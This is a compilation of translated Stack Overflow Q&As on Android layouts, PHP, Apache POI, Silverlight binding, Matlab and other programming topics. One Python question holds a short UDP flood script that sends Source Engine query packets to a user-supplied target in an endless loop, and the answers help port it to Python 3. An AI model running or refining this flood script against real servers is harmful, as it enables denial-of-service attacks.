    ... do your thing here ...
  }
}

document.addEventListener("click", observerMethod, false); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T13:00:34.273

您可以调用“调度程序”函数传递您需要调用的真实函数，例如

```
<a onclick="callfun(f1)">Click Me</a>
<a onclick="callfun(f2)">Click Me 2</a>

function f1 { console.log("Hello f1"); }
function f2 { console.log("Hello f2"); }

function callfun(f){
   /* do something before */

   if ('function' === typeof f) {
     f();
   }
} 
```

# c# - 无法解决“反序列化期间引用跟踪的对象更改引用”异常

> ID：13703412
> 
> 赞同：0
> 
> 时间：2012-12-04T12:53:57.467
> 
> 标签：c#, .net, serialization, protobuf-net

我们正在从 .NET 原生序列化转移到 protobuf-net。现在我们正试图“取消绘制”一个复杂的数据结构，因为我们遇到了一个异常“反序列化期间引用跟踪的对象更改了引用”。我知道我们需要继续重构所涉及的类，但我无法掌握调试信息。

我编辑的堆栈跟踪：

```
en ProtoBuf.BclHelpers.ReadNetObject(Object value, ProtoReader source, Int32 key, Type type, NetObjectOptions options)
en proto_6(Object , ProtoReader )
en proto_14(Object , ProtoReader )
en proto_12(Object , ProtoReader )
en proto_6(Object , ProtoReader )
en proto_4(Object , ProtoReader )
en proto_2(Object , ProtoReader )
en My.BlobManager.deserialize(Byte[] buffer)
en My.BlobManager.Load(String guid) 
```

我假设“proto_N”指的是标记属性，对吧？这些数字与标签相同吗？欢迎任何有关如何调试的建议。问候，H.

# php - 使用 GET 参数重新加载页面

> ID：13703421
> 
> 赞同：0
> 
> 时间：2012-12-04T12:54:12.633
> 
> 标签：php, get, reload

我现在正在开发一个 PHP 页面，但我遇到了一个问题。如何使用 PHP 重新加载带有获取参数的网页？例如：

```
www.example.com/page.php 
```

这是之前的页面。

```
www.example.com/page.php?view=list 
```

这是后面的页面。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T12:56:00.483

通过以下方式执行重定向`header`：

[http://php.net/manual/en/function.header.php](http://php.net/manual/en/function.header.php)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T12:59:38.913

在 page.php 的顶部

```
<?php
if(!isset($_GET['view'])){
  header('Location: page.php?view=list');
  exit;
}
?> 
```

如果尚未设置，这将使用所需的 GET 参数集重新加载页面。

通常，尽管您只需使用文本中已设置的 GET 参数创建 HREF 链接...

# android - 滑动时获取 RatingBar 值

> ID：13703423
> 
> 赞同：4
> 
> 时间：2012-12-04T12:54:28.270
> 
> 标签：android, ratingbar

我想在滑动时读取评分栏值以更改文本评分值（差、好等）我正在使用`setOnRatingBarChangeListener`它，但它在用户从栏松开手指后才起作用。我也尝试过`onDragListener`，但没有成功。当然我有`android:isIndicator="false"`xml，但没有变化。

是否有任何其他侦听器，用于立即获得评分的代码 - 因为在滑动时正确重绘了星星。提前致谢

罗马

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:32:26.603

您必须扩展`RatingBar`、覆盖`onTouchEvent()`和检查`MotionEvent.ACTION_MOVE`事件。

```
public boolean onTouchEvent(MotionEvent event) {
    switch (event.getAction()) {
        case MotionEvent.ACTION_MOVE:
            if (isPressed()) {
                final float x = event.getX();
                final float THRESHOLD = 1.0;
                if (Math.abs(x - prevX) > THRESHOLD) {
                   getProgress(); // Now compare with previous progress
                }
                prevX = x;
            }
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-04-20T19:06:04.593

该代码在 Log cat 上打印当前的 rating 值，而它正在滑动。

```
final RatingBar ratingBar = (RatingBar) findViewById(R.id.rating_bar);

ratingBar.setOnTouchListener(new View.OnTouchListener() {
        @Override
        public boolean onTouch(View v, MotionEvent event) {
            switch (event.getAction()) {
                case MotionEvent.ACTION_MOVE:
                    Log.d("LOG", String.format("%f", ratingBar.getRating());

                }
            return false;
        }
}); 
```

# stored-procedures - 使用单值参数动态调用存储过程的数据集

> ID：13703436
> 
> 赞同：0
> 
> 时间：2012-12-04T12:55:03.350
> 
> 标签：stored-procedures, reporting-services, ssrs-2008, reporting

我会尽量清楚我的情况。我有一个`ds1`具有用户 ID 的数据集和另一个数据集`ds2`（一个存储过程），它返回每个 ID 的结果。

`ds2`（存储过程）只接受单值参数，所以我需要为每个 ID 调用而不是传递多值参数。

我有一个按用户分组的表，在第二列中我有使用`ds2`. 如何将每个用户 ID 的值传递给`ds2`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T15:02:52.863

最简单的方法是使用子报表：创建一个具有单个参数并调用`ds2`. 此报告将只是包含图表的一个单元格的内容。

现在将此报表作为子报表放入您已经创建的表中。将用户字段值从连接`ds1`到子报表的参数。

另一种方法是重新设计你的数据集，也许加入到数据提供者处。

# excel - 在 Matlab 中导入 excel 文件

> ID：13703440
> 
> 赞同：4
> 
> 时间：2012-12-04T12:55:15.680
> 
> 标签：excel, matlab, ubuntu

我有一些我想在 Ubuntu 的 Matlab R2011a 版本中导入的 excel 文件。我无法继续并最终出现错误

```
Warning: Could not start Excel server for import, 'basic' mode will be used. Refer to HELP XLSREAD for more information. 
> In xlsread at 175
  In PCT_DART at 38" 
```

是否有任何包或应该做的事情，因为 excel 文件很大，“基本”模式不足以从文件中提取所有数据。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:07:29.473

是的，烦人不是吗？

Mathworks 或多或少被迫决定使用 MS COM 服务器来导入 Excel 文件，这些文件包含比单个工作表上的纯数据更“高级”的任何内容。此决定的一个*严重*后果是所有 Linux 和 Mac 用户都会收到此错误，并且当数据分布在多个工作表上、Excel 文件包含图表等时，导入能力将受到限制。

如果您想保持 Excel 文件不变，那么您在这里无能为力。“幸好”，很多人都为此苦苦挣扎。例如，请看[这里](http://www.mathworks.nl/matlabcentral/answers/14817)，建议尝试将 Excel 文件保存为旧格式（例如 Excel 98/95），然后重试。

我通常做的只是将我需要的数据复制粘贴或导出到纯文本 CSV 中，然后尝试`try...catch...end`在跨平台 Matlab 代码中出现此类错误。理想情况下，这已经在数据生成端完成；如果有可能以纯文本格式而不是 XLS 生成数据，那就去做吧。

# excel - 通过 POI 在 Excel 工作表的标题上设置过滤器

> ID：13703441
> 
> 赞同：48
> 
> 时间：2012-12-04T12:55:16.797
> 
> 标签：excel, apache-poi, autofilter

我生成了一张表格，非常标准的标题和数据列。

我想为工作表打开“过滤”功能，以便用户可以轻松地对数据进行排序和过滤。

我可以这样使用 POI 吗？

* * *

## 回答 #1

> 赞同：73
> 
> 时间：2012-12-04T13:01:38.530

保存过滤区域的第一个和最后一个单元格，然后执行：

```
sheet.setAutoFilter(new CellRangeAddress(firstCell.getRow(), lastCell.getRow(), firstCell.getCol(), lastCell.getCol())); 
```

例如，从下表中。

```
>x         (x, y)
  0123456  
0|--hhh--|   h = header
1|--+++--|   + = values
2|--+++--|   - = empty fields
3|--+++--|
4|-------| 
```

第一个单元格将是第一个`+`(2,1) 单元格上方的标题。最后一个将是最后一个`+`单元格 (5,3)

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2018-12-28T10:45:56.623

在标题上添加过滤器的最简单方法：

```
sheet.setAutoFilter(new CellRangeAddress(0, 0, 0, numColumns));
sheet.createFreezePane(0, 1); 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2017-04-27T13:09:28.527

如果您还想以编程方式设置过滤器，则可以使用以下内容：

```
void setAutoFilter(final XSSFSheet sheet, final int column, final String value) {
    sheet.setAutoFilter(CellRangeAddress.valueOf("A1:Z1"));

    final CTAutoFilter sheetFilter = sheet.getCTWorksheet().getAutoFilter();
    final CTFilterColumn filterColumn = sheetFilter.addNewFilterColumn();
    filterColumn.setColId(column);
    final CTFilter filter = filterColumn.addNewFilters().insertNewFilter(0);
    filter.setVal(value);

    // We have to apply the filter ourselves by hiding the rows: 
    for (final Row row : sheet) {
        for (final Cell c : row) {
            if (c.getColumnIndex() == column && !c.getStringCellValue().equals(value)) {
                final XSSFRow r1 = (XSSFRow) c.getRow();
                if (r1.getRowNum() != 0) { // skip header
                    r1.getCTRow().setHidden(true);
                }
            }
        }
    }
} 
```

相关 Gradle 依赖项：

```
 // https://mvnrepository.com/artifact/org.apache.poi/poi
compile group: 'org.apache.poi', name: 'poi', version: '3.9'

// https://mvnrepository.com/artifact/org.apache.poi/poi-ooxml
compile group: 'org.apache.poi', name: 'poi-ooxml', version: '3.9'

// https://mvnrepository.com/artifact/org.apache.poi/poi-ooxml-schemas
compile group: 'org.apache.poi', name: 'poi-ooxml-schemas', version: '3.9'

// https://mvnrepository.com/artifact/org.apache.poi/ooxml-schemas
compile group: 'org.apache.poi', name: 'ooxml-schemas', version: '1.3' 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2019-02-25T11:08:41.420

利用`sheet.setAutoFilter(CellRangeAddress.valueOf("B1:H1"));`

我们只需要指定表格数据的标题单元格。在我的示例中，标题从单元格**B1**开始，到单元格**H1**结束。
Excel 会自动找到它下面的数据，并将其显示在过滤器选项中。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2017-10-26T21:22:04.033

我想出了如何用 NPOI 做到这一点。
您将 CT_AutoFilter 添加到 CT_Table。

我猜它对 POI 和 NPOI 的工作方式相同。

```
 cttable.autoFilter = new CT_AutoFilter();
    cttable.autoFilter.@ref = "A1:C5";   // value is data and includes header. 
```

# silverlight - 这个绑定语法有什么问题：{Binding List[Index]}？

> ID：13703445
> 
> 赞同：2
> 
> 时间：2012-12-04T12:55:43.613
> 
> 标签：silverlight, xaml, data-binding

给定一个数据对象：`{List = new Int32[] {0, 1, 2, 3}, Index = 2}`我想使用以下语法将其绑定到控件：

```
{Binding List[Index]} 
```

这不起作用并且不会引发任何异常。我也无法通过将转换器附加到此绑定来查看发生了什么。

只要我能做到，`{Binding List[0]}`为什么这个不起作用：`{Binding List[Index]}`？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T15:43:47.190

您必须为此使用带有转换器的 MultiBinding，因为 Index 本身需要绑定。

例如

```
<MyControl>
  <MyControl.Text>
    <MultiBinding Converter="{StaticResource yourConverter}">
      <MultiBinding.Bindings>
        <Binding Path="List" />
        <Binding Path="Index" />
      </MultiBinding.Bindings>
    </MultiBinding>
  </MyControl.Text>
</MyControl> 
```

和转换器：

```
public class NameConverter : IMultiValueConverter
{
    public object Convert(object[] values, Type targetType, object parameter, CultureInfo culture)
    {
        if (values.Length != 2 || !(values[0] is IList<MyItemType>) || !(values[1] is int))
            return Binding.DoNothing;

        var list = (IList<MyItemType>)values[0];
        var index = (int)values[1];

        if (index < 0 || index >= list.Count)
            return Binding.DoNothing;

        return list[index];
    }

    public object[] ConvertBack(object value, Type[] targetTypes, object parameter, CultureInfo culture)
    {
        return Binding.DoNothing;
    }
} 
```

Silverlight 的多重绑定解决方案（由 Google 提供）：

SL3：[http ://www.olsonsoft.com/blogs/stefanolson/post/Improvements-to-Silverlight-Multi-binding-support.aspx](http://www.olsonsoft.com/blogs/stefanolson/post/Improvements-to-Silverlight-Multi-binding-support.aspx)

SL4：[http ://www.scottlogic.co.uk/blog/colin/2010/05/silverlight-multibinding-solution-for-silverlight-4/](http://www.scottlogic.co.uk/blog/colin/2010/05/silverlight-multibinding-solution-for-silverlight-4/)

SL5： http: [//www.codeproject.com/Articles/286171/MultiBinding-in-Silverlight-5](http://www.codeproject.com/Articles/286171/MultiBinding-in-Silverlight-5)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T15:33:21.187

解析 XAML 时会评估绑定表达式。因此，在那里使用的值必须是编译时常量，以便它们可以构建到稍后用于绑定的表达式中。

因此，一种方法是在您的 ViewModel 上创建一个属性，该属性公开您要绑定到的 List 的项目。

不幸的是，在这里使用 a`ValueConverter`也不是选项，因为您不能绑定到`ConverterParameter`绑定表达式的 ，因此转换器也不知道索引...

# sql-server - 无法加载动态库 'php_mssql.dll'

> ID：13703446
> 
> 赞同：3
> 
> 时间：2012-12-04T12:55:47.787
> 
> 标签：sql-server

我已经在 Windows XP 中安装了带有 PHP 版本 5.4.4 的 xammp。我已经添加了所有 DLL 文件并在 php.ini 文件中进行了配置。仍然我得到'无法加载动态库'php_mssql.dll' - 找不到指定的模块。'。

请告诉我可能是什么问题。提前致谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T13:05:57.897

This is a configuration issue. Go through the following checklist:

*   Check the value of `extension_dir` in `php.ini`. Try adding a full path to it like `extension_dir = "C:/PHP/ext/"`.
*   Run `phpinfo()` to see if the correct `php.ini` file is being loaded. If you can't seem to get it to load the right file add the environment variable `PHPRC` and set it to your PHP path (be sure to restart the server/system so that the environment variable comes into effect).
*   This may not be your case but check if the `ext` directory has enough permissions for the user context under which PHP will access files.

# android - 滚动视图内的线性布局的Android困难

> ID：13703447
> 
> 赞同：4
> 
> 时间：2012-12-04T12:55:48.340
> 
> 标签：android, scrollview, android-linearlayout

我的布局有问题，最后一个线性布局似乎没有完全展开。仅供参考，这是我的 xml 文件：

```
<?xml version="1.0" encoding="utf-8"?>
<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/scrollView1"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" >

<LinearLayout
android:layout_width="wrap_content"
android:layout_height="wrap_content"
android:background="@drawable/ihealthfirst"
android:orientation="vertical" >

<include
    android:layout_width="fill_parent"
    android:layout_height="match_parent"
    layout="@layout/tabsfornutrition" />

<LinearLayout
    android:layout_width="match_parent"
    android:layout_height="match_parent" >

    <ImageView
        android:id="@+id/imagefruits"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:contentDescription="@string/vegetables"
        android:paddingBottom="15dp"
        android:paddingLeft="15dp"
        android:paddingRight="15dp"
        android:paddingTop="15dp"
        android:src="@drawable/fruits_logo" />

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="vertical"
        android:paddingRight="15dp"
        android:paddingTop="35dp" >

        <TextView
            android:id="@+id/txtApples"
            style="@style/NutritionText"
            android:layout_width="fill_parent"
            android:layout_height="0dp"
            android:layout_gravity="fill_vertical"
            android:layout_weight="0.50" />

        <Button
            android:id="@+id/btViewApples"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:text="@string/viewnutritionalfacts" />
    </LinearLayout>
</LinearLayout>

<LinearLayout
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:orientation="vertical"
    android:layout_gravity="bottom" >

<TextView
    android:id="@+id/descheader"
    style="@style/DescriptionHeader"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:paddingLeft="15dp"
    android:paddingRight="15dp"
    android:text="@string/description" />

<TextView
    android:id="@+id/fruitDesc"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:layout_gravity="center_vertical|right"
    android:paddingLeft="15dp"
    android:paddingTop="10dp" />

</LinearLayout>

</LinearLayout>

</ScrollView> 
```

![在此处输入图像描述](../Images/bf824af4dc9a7fc0e248aa4048883688.png)

如果你能帮助我，我将不胜感激。谢谢

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-12-04T13:00:27.563

您是否尝试添加`android:fillViewport="true"`到您的 ScrollView 布局？（见罗曼盖伊的把戏：[http](http://www.curious-creature.org/2010/08/15/scrollviews-handy-trick/) ://www.curious-creature.org/2010/08/15/scrollviews-handy-trick/ ）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T13:01:48.930

包含的`tabsfornutrition`元素有一个`layout_height`of`match_parent`并且它是其父元素的第一个子元素，因此它显然会占用所有可用空间......

尝试设置`wrap_content`此元素和之后的元素：

```
<include
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    layout="@layout/tabsfornutrition" />

<LinearLayout
    android:layout_width="match_parent"
    android:layout_height="wrap_content" > 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T13:03:55.650

Scrollview for only one child define and first of all u define scrollview and then define relative layout and then whatever your require for layouts using.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-04T13:51:00.613

我希望你谈论具有描述的 LinearLayout，首先我认为你不清楚 fill_parent / match_parent / wrap_content，为什么我会这样想，

U r 将高度和宽度设置为包含布局和兄弟线性布局的 fill_parent。

> ```
> <includ
>   android:layout_width="fill_parent"
>   android:layout_height="match_parent"
>   layout="@layout/tabsfornutrition" />
> 
> <LinearLayout
>   android:layout_width="match_parent"
>   android:layout_height="match_parent" > 
> ```

但你不必担心一个布局与另一个布局重叠。

因此，请遵循以下结构，这将使您清楚地了解情况。我希望你需要填写有描述的线性布局，如果没有清楚地更新你的问题..

```
<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/scrollView1"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" >

    <LinearLayout
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="@drawable/ihealthfirst"
    android:orientation="vertical" >

        <include
            android:layout_width="match_parent" 
            android:layout_height="wrap_content"
            layout="@layout/tabsfornutrition" />

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="match_parent" 
            android:layout_weight="1" >

            <ImageView
                android:id="@+id/imagefruits"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:contentDescription="@string/vegetables"
                android:paddingBottom="15dp"
                android:paddingLeft="15dp"
                android:paddingRight="15dp"
                android:paddingTop="15dp"
                android:src="@drawable/fruits_logo" />

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical"
                android:paddingRight="15dp"
                android:paddingTop="35dp" >

                <TextView
                    android:id="@+id/txtApples"
                    style="@style/NutritionText"
                    android:layout_width="fill_parent"
                    android:layout_height="0dp"
                    android:layout_gravity="fill_vertical"
                    android:layout_weight="0.50" />

                <Button
                    android:id="@+id/btViewApples"
                    android:layout_width="fill_parent"
                    android:layout_height="wrap_content"
                    android:text="@string/viewnutritionalfacts" />
            </LinearLayout>
        </LinearLayout>

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:orientation="vertical"
            android:layout_gravity="bottom" >

            <TextView
                android:id="@+id/descheader"
                style="@style/DescriptionHeader"
                android:layout_width="fill_parent"
                android:layout_height="wrap_content"
                android:paddingLeft="15dp"
                android:paddingRight="15dp"
                android:text="@string/description" />

            <TextView
                android:id="@+id/fruitDesc"
                android:layout_width="fill_parent"
                android:layout_height="wrap_content"
                android:layout_gravity="center_vertical|right"
                android:paddingLeft="15dp"
                android:paddingTop="10dp" />

        </LinearLayout>

    </LinearLayout>

</ScrollView> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-04T13:00:16.300

LinearLayout（和 textViews）设置为 wrap_content。将第二个 LinearLayout 设置为：

```
android:layout_height="match_parent" 
```

* * *

## 回答 #6

> 赞同：-2
> 
> 时间：2012-12-04T13:00:36.707

这是因为你告诉它`wrap_content`的高度。应该是`match_parent`。

# api - geolocation.watchposition 不起作用，请帮助我

> ID：13703453
> 
> 赞同：0
> 
> 时间：2012-12-04T12:55:59.470
> 
> 标签：api, google-maps-api-3, geolocation

我输入了 geolocation.watchPosition API，但是当我在浏览器上运行它时，地图根本不显示。谁能告诉我如何解决这个问题？

```
<script>

if (navigator.geolocation)
{
    function showPositionOnMap(position)
    {
        var point = new google.maps.LatLng(position.coords.latitude, 
        position.coords.longitude),

        myOptions = {
            zoom: 15,
            center: point,
            mapTypeId: google.maps.MapTypeId.ROADMAP
        },

        mapDiv = document.getElementById("mapDiv"),
        map = new google.maps.Map(mapDiv, myOptions),
                marker = new google.maps.Marker({
            position: point,
            map: map,
            title: "You are here"
            });
    }

    var timeoutVal = 10 * 1000 * 1000;
    navigator.geolocation.watchPosition(showPositionOnMap, errorMessage,
    {
        enableHighAccuracy: true, timeout: timeoutVal, maximumAge: 0 });
}

else
{
    alert("Geolocation is not supported by this browser");
}

</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T18:07:17.697

使用现有`errorMessage`函数，此代码运行良好。也许，您的浏览器阻止了地理位置，因为您没有允许它。

# api - 寻找网络摄像机 API

> ID：13703455
> 
> 赞同：3
> 
> 时间：2012-12-04T12:56:05.583
> 
> 标签：api, ip-camera

我正在寻找网络 IP 摄像头接口，更准确地说，我购买了[Neo Coolcam IP 摄像头型号： NIP-02BGPW3A2](http://www.szneo.com/productshow.aspx?id=33)。我正在寻找它的 API\Interface 来玩它。

我开始跟踪它的请求和响应，但不幸的是我还不能控制它，也找不到所有的命令（这个模型有移动和灯光选项）。

我正在寻找示例和/或命令列表，感谢您的帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-06T17:19:54.333

[在这里](http://www.paillassou.com/DCS-2121/CGI_2121.pdf)找到了一些文档。似乎可以解决问题。

# python - TypeError: 'str' 不支持缓冲区接口 4

> ID：13703458
> 
> 赞同：1
> 
> 时间：2012-12-04T12:56:15.203
> 
> 标签：python, python-3.x, buffer

这是用 Python 2.x 编写的代码，我想让它在 Python 3.x 中运行。

这条线在 Python 3.x 中会是什么样子？

```
while True:
    sock.sendto(bytes,(ip,port)) 
```

注意：今天之前我从未使用过 Python，所以如果这对你来说是个愚蠢的问题，请不要开枪。

* * *

这是整个代码，在 Python 3 中工作应该是什么样子？

```
import socket, sys

sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = '\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x00'

ip = input("Target IP: ")
port = input("Target Port: ")

print ("Exit the program to stop the flood")

while True:
    sock.sendto(bytes,(ip,port)) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:07:09.567

Python 3 中的代码完全相同。

不同之处在于`str`type 在 Python 3 中表示 Unicode 字符串。`str`在 Python 2 中是字节字符串。

转换`bytes`为`bytes`例如`s.encode(encoding)`. 还要重命名`bytes`以避免与内置名称混淆`bytes`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T13:04:14.413

Most likely `bytes` is a str, which means it is a collection of characters. Over the network, you cannot send characters, but only bytes. Characters can be encoded into a byte stream in several ways. You most probably want to use utf-8 for it. You can encode a str into a bytes object using `the_string.encode ('utf-8')`. This bytes object can be sent over the network.

# android - 在 Windows 上的 Android 上构建 Pocketsphinx

> ID：13703459
> 
> 赞同：0
> 
> 时间：2012-12-04T12:56:20.103
> 
> 标签：android, mingw, cmusphinx

我已经[在android上关注这个Building Pocketsphinx](http://cmusphinx.sourceforge.net/2011/05/building-pocketsphinx-on-android/)好几天了，我很困惑现在该怎么做。我会一步一步地告诉我我做了什么，这样你就会知道我做错了什么。

我正在使用 Windows 7 64 位。

首先我已经下载[了 PocketSphinx](http://cmusphinx.svn.sourceforge.net/viewvc/cmusphinx/trunk/pocketsphinx/?view=tar)和[Sphinxbase](http://cmusphinx.svn.sourceforge.net/viewvc/cmusphinx/trunk/sphinxbase/?view=tar)并且我已经将它解压到`C:\Sphinx`. 然后我只从[MINGW DOWNLOAD下载了](http://sourceforge.net/projects/mingw/files/Installer/mingw-get-inst/mingw-get-inst-20120426/)**mingw**。在我下载了这些东西之后，我启动了 mingw.exe，作为一个业余爱好者，我只尝试过，但没有做任何事情，所以我转到下一个安装**swig**的说明。`sudo -i`

 **我试着打字`apt-get install swig`，和`yum install swig`上次一样，它不起作用。然后我试过`mingw-get install swig`了，结果是`mingw-get.exe: *** ERROR *** swig: unknown package`。因此，我再次尝试了 sphinxbase 的下一个指令安装。

在安装 sphinxbase 时，我去了 sphinxbase 目录 -`C:\Sphinx\sphinxbase`我输入了`./autogen.sh`. 因此，它编译没有问题，我输入`./configure`它编译得也很好。接下来是`make`我遇到问题的地方，它已编译但出现错误。错误是：

```
make[3]: *** [pio.lo] Error 1
make[3]: Leaving directory `/c/sphinx/sphinxbase/src/libsphinxbase/util`
make[2]: *** [All-recursive] Error 1
make[2]: Leaving directory `/c/sphinx/sphinxbase/src/libsphinxbase`
make[1]: *** [All-recursive] Error 1
make[1]: Leaving directory `/c/sphinx/sphinxbase/src`
make: *** [all-recursive] Error 1 
```

这是我到目前为止遇到的问题。然后我尝试`pio.lo`从[pio.lo download 下载](http://www.cs.cmu.edu/afs/cs.cmu.edu/project/listen/weichen/sphinx/sphinxbase/src/libsphinxbase/util/)。所以它修复了错误，但出现了另一个错误。第二个错误：

```
collect2.exe: error: ld returned 1 exit status
make[2]: *** [sphinx_fe.exe] Error 1
make[2]: Leaving directory `/c/sphinx/sphinxbase/src/sphinx_fe`
make[1]: *** [all-recursive] Error 1
make[1]: Leaving directory `/c/sphinx/sphinxbase/src`
make: *** [all-recursive] Error 1 
```

这就是我卡住的地方。我试过复制`sphinx_fe`之后`sphinxbase-0.7-win32.zip`没有任何反应。编译只会删除`sphinx_fe.exe`.

我的问题是**我现在应该做什么？**

如果不清楚，请随时发表评论和询问。感谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-05T09:57:49.303

目前不支持 MinGW，请尝试使用 Cygwin。

其实不需要运行autogen.sh和make，解压源码就够了

sudo、yum 等命令是 Unix 专用命令，您需要在 windows 上搜索它们的类比。

有关 Windows 上 SWIG 的更多信息，请参阅

[http://www.swig.org/Doc2.0/Android.html](http://www.swig.org/Doc2.0/Android.html)**

# windows-phone-7 - Windows Phone 7 导航

> ID：13703460
> 
> 赞同：0
> 
> 时间：2012-12-04T12:56:30.200
> 
> 标签：windows-phone-7, routed-events

我在 MainPage 和 details 页面之间导航时遇到问题。

在主页上，代码如下所示：

```
private void MainPage_Loaded(object sender, RoutedEventArgs e)
    {
          State.Clear();
          List<Level> lst = new List<Level>();
          using (SqliteCommand selectCmd = Constants.conn.CreateCommand())
          {
              Constants.conn.Open();
              selectCmd.Transaction = Constants.conn.BeginTransaction();
              selectCmd.CommandText = " SELECT * FROM Levels";

              using (SqliteDataReader reader = selectCmd.ExecuteReader())
              {

                  while (reader.Read())
                  {
                      Level lev = new Level();
                      lev.ID = Convert.ToInt32(reader.GetValue(0));
                      lev.Name = reader.GetValue(1).ToString();
                      lev.levelScore = Convert.ToInt32(reader.GetValue(2));
                      lst.Add(lev);
                  }
              }
              selectCmd.Transaction.Connection.Close();
          }
          Constants.conn.Close();
          levelList.ItemsSource = lst;

        } 
```

它设置页面上的项目。我在详细信息页面上导航。当我导航回 MainPage 时，问题就来了……虽然 State 是 Clear 并且 levelItems 是 0 它呈现了页面的前一个视图，并且当它尝试访问 sqlConnection 时会抛出异常。

# html - 背景图像不会出现在 ie 上

> ID：13703461
> 
> 赞同：0
> 
> 时间：2012-12-04T12:56:31.260
> 
> 标签：html, css

这适用于 Firefox 和 chrome：

```
<div id="popup" style="display: block;">
        <div id="contentWrapper">

            <div id="popHeader">
                <span id="popupQuestion">The  nature.</span>
                <a id="popupYes" href="#"> </a>
                <a id="popupNo" href="/">Leave</a>
            </div>
        </div>
    </div>

#contentWrapper {
background-image: url("http://bestcamctory.com/images/warning/warning_bg.png");
height: 100%;
position: relative;
width: 100%;
} 
```

但是在 ie 上没有显示背景图像。这是为什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:06:26.087

IIRC，您可能需要为div`contentWrapper`或`popup`div 定义大小。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T13:15:06.803

如果您的子元素是绝对定位的，那么`#contentWrapper`已经折叠，因为在文档的正常流程中没有元素可以告诉它有多高。A`height: 100%`是相对的：元素只会和它的父元素一样高，默认情况下它只会和它的子元素一样高（当前为 0）。

您可以尝试一些方法来解决此问题。

*   添加一个最小高度`#contentWrapper`（从 1em 开始）
*   从一个或所有子元素中删除绝对定位。

您也可以尝试添加`height: 100%`到每个祖先元素。

# python - Python：二进制字符串错误模拟

> ID：13703464
> 
> 赞同：1
> 
> 时间：2012-12-04T12:56:37.810
> 
> 标签：python, binary-data, crc, error-code

我目前正在编写一个测试来验证一些纠错代码：

```
inputData1  = "1001011011"
inputData2  = "1001111011"
fingerPrint1 = parityCheck.getParityFingerprint(inputData1)
                                      # Expected: fingerPrint1=0

fingerPrint2 = parityCheck.getParityFingerprint(inputData2)
                                      # Expected: fingerPrint2=1

if fingerPrint1 == fingerPrint2:
    print "Test failed: errorCorrectingAlgo1 failed to detect error"
else:
    print "Test success: errorCorrectingAlgo1 successfully detected error" 
```

是否有一个 python 类可以用来在二进制字符串上自动生成错误（突发错误、单个事件、重新排序等）？例如：

```
inputData1 = "1001011011"
inputData1BurstError = applyBurstError(inputData1)  # Eg: inputData1BurstError =
                                         ("1011111011", or "1001000000", or etc.)

inputData1RandomError = applyRandomError(inputData1)# Eg: inputData1RandomError =
                                         ("0001101011", or "0111101101", or etc.)

inputData1Reordering = applyReordering(inputData1)  # Eg: inputData1Reordering =
                                         ("0101110011", or "1101101001", or etc.)

inputData1SingleEvent = applySingleEvent(inputData1)# Eg: inputData1SingleEvent =
                                         ("1001011011", or "1000011011", or etc.) 
```

我知道这样一个类可以很容易地实现二进制检查验证。但是，我需要一个更完整的类来测试更复杂的错误检测代码，例如 CRC。我过去已经使用过 Netem ( [http://www.linuxfoundation.org/collaborate/workgroups/networking/netem](http://www.linuxfoundation.org/collaborate/workgroups/networking/netem) ) 来修改电信实验室中进入和离开接口的数据包。但是，我怀疑这次 Netem 是否能很好地解决我的问题，因为我的整个测试计划仅在我的台式计算机上运行。另外，这次我正在使用 Windows 7。此外，Netem 没有为我的测试实现提供一套完整/复杂的功能。

任何帮助/建议将不胜感激。

谢谢！

相关问题：[How to shuffle a list with Gaussian distribution](https://stackoverflow.com/questions/13706027/python-how-to-shuffle-a-list-with-gaussian-distribution)

# compass-sass - 如何在 Windows 上安装指南针

> ID：13703472
> 
> 赞同：20
> 
> 时间：2012-12-04T12:56:58.907
> 
